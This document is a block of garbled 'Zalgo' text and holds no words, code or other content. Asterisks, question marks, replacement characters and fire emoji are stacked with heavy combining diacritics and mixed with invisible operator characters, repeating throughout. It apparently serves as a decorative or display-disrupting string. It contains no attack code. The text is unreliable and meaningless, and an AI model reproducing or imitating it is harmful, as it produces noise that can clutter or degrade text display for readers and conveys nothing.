̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̝͓̃̔̌̑́͂͂̓͂̎̒̉͠